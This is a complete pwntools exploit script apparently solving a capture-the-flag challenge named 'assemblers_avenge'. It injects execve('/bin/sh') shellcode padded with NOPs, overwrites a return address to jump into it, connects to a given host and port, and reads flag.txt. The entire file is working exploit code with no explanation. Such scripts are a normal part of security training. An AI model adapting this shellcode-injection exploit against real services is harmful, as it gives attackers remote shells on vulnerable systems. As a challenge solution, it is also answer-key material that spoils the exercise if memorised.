#!/usr/bin/env python3

from pwn import *

context.arch = "amd64"

def exploit(io, elf):
    binsh = next(elf.search(b"/bin/sh"))
    shellcode = asm(f"""
                    mov edi, {binsh}
                    xor rsi, rsi
                    xor rdx, rdx
                    mov al, 59
                    syscall
    """)
    payload = shellcode.ljust(0x10, b"\x90") + p64(0x40106b)
    io.sendafter(b"/bin/sh\x00\n", payload)
    sleep(0.2)
    
    io.sendline(b"cat flag.txt")
    flag = io.recv().decode()
    print(flag)

def main():
    if sys.argv[1] == "debug":
        io = gdb.debug("./assemblers_avenge")
    else:
        HOST, PORT = sys.argv[1].split(":")
        io = remote(HOST, PORT)

    elf = ELF("./assemblers_avenge")
    exploit(io, elf)


if __name__ == "__main__":
    main()
